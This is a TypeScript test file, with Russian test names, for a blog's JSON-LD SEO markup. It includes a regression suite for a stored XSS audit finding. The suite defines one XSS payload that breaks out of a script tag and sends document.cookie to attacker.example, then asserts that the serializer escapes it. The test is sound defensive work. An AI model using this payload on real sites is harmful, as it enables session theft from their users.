import { describe, expect, it } from "vitest";
import { blogIndexStructuredData, blogPostStructuredData, BLOG_URL } from "@/features/blog/blogSeo";
import type { BlogPost } from "@/features/blog/posts";
import { serializeJsonLd } from "@/lib/jsonLd";
import { CONTENT_LANGUAGE, ORGANIZATION_ID, SITE_URL } from "@/lib/seo";
import { seedBlogPosts } from "@/tests/fixtures/seedContent";

const post = seedBlogPosts[0];

describe("разметка статьи", () => {
  const schemas = blogPostStructuredData(post);
  const article = schemas.find((schema) => schema["@type"] === "BlogPosting");

  it("название статьи совпадает во всех слоях разметки", () => {
    expect(article).toMatchObject({
      headline: post.title,
      url: `${BLOG_URL}/${post.slug}`,
      inLanguage: CONTENT_LANGUAGE,
    });

    const breadcrumbs = schemas.find((schema) => schema["@type"] === "BreadcrumbList");
    expect(JSON.stringify(breadcrumbs)).toContain(post.title);
  });

  it("даты берутся из данных статьи, а не из текущего момента", () => {
    expect(article).toMatchObject({
      datePublished: post.publishedAt,
      dateModified: post.modifiedAt,
    });
  });

  it("автор — ровно то значение, что хранится у статьи", () => {
    expect(JSON.stringify(article)).toContain(post.author);
  });

  it("издатель указан ссылкой на общий узел организации", () => {
    expect(article).toMatchObject({ publisher: { "@id": ORGANIZATION_ID } });
  });

  it("не заявляет рейтингов, отзывов и вопросов-ответов", () => {
    const serialized = JSON.stringify(schemas);

    for (const forbidden of ["aggregateRating", "Review", "FAQPage", "Question"]) {
      expect(serialized).not.toContain(forbidden);
    }
  });
});

describe("разметка раздела блога", () => {
  it("описание берётся из содержимого раздела, а не зашито в коде", () => {
    const schemas = blogIndexStructuredData(seedBlogPosts, {
      headline: "Блог QBit-Studio-Ai",
      description: "Описание раздела из админ-панели.",
    });
    const page = schemas.find((schema) => schema["@type"] === "CollectionPage");

    expect(page).toMatchObject({
      url: BLOG_URL,
      description: "Описание раздела из админ-панели.",
    });
    // Бренд не удваивается: заголовок раздела уже содержит его.
    expect(page).toMatchObject({ name: "Блог QBit-Studio-Ai" });
  });
});

/**
 * Регрессия на сохранённый XSS (аудит 2026-07-27, SEC-01) — теперь СКВОЗНАЯ.
 *
 * `src/tests/unit/lib/jsonLd.test.ts` проверяет сам сериализатор. Здесь проверяется путь целиком:
 * название статьи из админ-панели → сборка разметки → строка внутри `<script>`. Так тест поймает
 * и возврат к прямому `JSON.stringify` в любой из этих точек, а не только правку helper'а.
 */
describe("безопасность JSON-LD при вредоносных данных из админ-панели", () => {
  const attack = "</script><script>fetch('https://attacker.example/?c='+document.cookie)</script>";

  const maliciousPost: BlogPost = {
    ...post,
    title: `Автоматизация ${attack}`,
    description: `Описание ${attack}`,
    author: `Автор ${attack}`,
    tags: [attack],
    category: attack,
  };

  it("название статьи с </script> не разрывает блок разметки", () => {
    const html = serializeJsonLd(blogPostStructuredData(maliciousPost));

    expect(html).not.toContain("</script");
    expect(html).not.toContain("<");
    expect(html).not.toContain(">");
    expect(html).toContain("\\u003c");
  });

  it("список статей с вредоносным названием тоже экранируется", () => {
    const html = serializeJsonLd(
      blogIndexStructuredData([maliciousPost], {
        headline: `Блог ${attack}`,
        description: `Описание ${attack}`,
      }),
    );

    expect(html).not.toContain("</script");
    expect(html).not.toContain("<");
  });

  it("данные не портятся: JSON.parse возвращает исходное название", () => {
    const parsed = JSON.parse(serializeJsonLd(blogPostStructuredData(maliciousPost)));
    const article = parsed.find(
      (schema: { "@type": string }) => schema["@type"] === "BlogPosting",
    ) as { headline: string };

    expect(article.headline).toBe(maliciousPost.title);
  });

  it("адреса в разметке остаются на основном домене", () => {
    const serialized = JSON.stringify(blogPostStructuredData(maliciousPost));

    expect(serialized).not.toMatch(/localhost|127\.0\.0\.1/);
    expect(serialized).toContain(SITE_URL);
  });
});
